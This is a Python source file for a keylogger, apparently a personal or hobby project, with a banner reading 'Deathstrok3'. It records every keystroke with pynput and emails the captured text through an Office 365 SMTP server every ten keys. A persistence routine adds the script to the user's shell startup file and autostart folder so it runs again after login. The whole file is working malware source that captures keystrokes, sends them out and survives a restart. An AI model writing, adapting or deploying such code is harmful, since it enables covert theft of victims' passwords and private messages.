#Import Key and Listener module
import shutil
import subprocess
import sys

subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])

import getpass
import smtplib
import ssl
import time

from pynput.keyboard import Key, Listener

print('''________                 __  .__              __                 __    
\______ \   ____ _____ _/  |_|  |__   _______/  |________  ____ |  | __\_____  \ 
 |    |  \_/ __ \\__  \\   __\  |  \ /  ___/\   __\_  __ \/  _ \|  |/ /  _(__  < 
 |    `   \  ___/ / __ \|  | |   Y  \\___ \  |  |  |  | \(  <_> )    <  /       \
/_______  /\___  >____  /__| |___|  /____  > |__|  |__|   \____/|__|_ \/______  /
        \/     \/     \/          \/     \/                          \/       \/''')

count = 0
subject = "insert email header"
full_log = '\n' #without it log will be sent in the header of the email. Body wil be empty 
sender_email = 'insert your email'
receiver_email = 'insert your email'
email = input('Enter email:')
password = getpass.getpass(prompt='Welcome Slade:', stream=None)
port = 587
context = ssl.create_default_context()
smtp_server = "smtp.office365.com"

#Time Interval
def timed_log():
    if len(full_log) >= 10:
        send_email()
        time.sleep(10) #time in seconds

#Email
def send_email():
    global full_log
    global message 
    if len(full_log) >= 10:
        try: 
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo() #optional
            server.starttls(context=context)
            server.ehlo() #optional
            server.login(sender_email, password)
            print(' Successful login! ')
            server.sendmail(sender_email, receiver_email,full_log)
            print(' Email sent. ')
            server.quit()
        except Exception as e:
            print(e)

#Without this Error will coccur if we try to call a boolean Value as a function
my_bool = False

# print the key strokes to the log file
#when key is pressed
def on_press(key):
  global keys, count, full_log
  full_log += str(key)
  count += 1

#Every 10 keys typed by user txt file is updated
#Can be any number
  if count >= 10:
    count = 0
    #Resets keys
    print('Deathstrok3 activated!')
    timed_log()
    print(full_log)
    
    if count == 0:
        full_log = '\n'



#When  key is released
#Breaks loop if we hit the escape key
def on_release(key):
  if key==Key.esc:
    return my_bool
      
def persistence():
    # Copy qterminal.desktop to autostart folder
    terminal_path = "/usr/share/applications/qterminal.desktop"
    autostart_path = "/home/kali/.config/autostart"
    shutil.copy(terminal_path, autostart_path)

    file_location = "/home/kali/.zshrc"
    command = "file path of the keylogger"
    
    # Open .zshrc file and check for entry for script
    with open(file_location) as file:
        file = file.readlines()
        # Strip newline character from last line of file and check if it matches command
        entry = file[-1].strip()
        if entry != command:
            append_command()
            print("Line created.")
        else:
            print("Line already exists.")

def append_command():
    # Add entry into .zshrc file
    file_location = "/home/kali/.zshrc"
    command = "/home/kali/Downloads/keylogger.py"

    with open(file_location, "a") as file:
        file.write(command)

persistence()
    
#Will continously loop through until broken
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
